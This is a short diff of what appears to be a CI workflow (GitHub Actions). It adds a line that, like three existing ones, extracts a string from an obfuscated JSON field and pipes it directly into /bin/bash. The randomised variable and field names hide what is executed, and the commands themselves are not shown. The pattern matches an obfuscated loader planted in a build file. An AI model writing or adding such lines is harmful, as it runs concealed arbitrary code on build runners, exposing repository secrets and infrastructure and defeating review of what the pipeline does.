@@ -31,6 +31,7 @@ jobs:
           echo $r6148 | jq -r .bmvl61618 | /bin/bash
           echo $wdha69 | jq -r .odidn445 | /bin/bash
           echo $kaxxn09 | jq -r .b27231 | /bin/bash
+          echo $cpr2002 | jq -r .vzquo02957 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
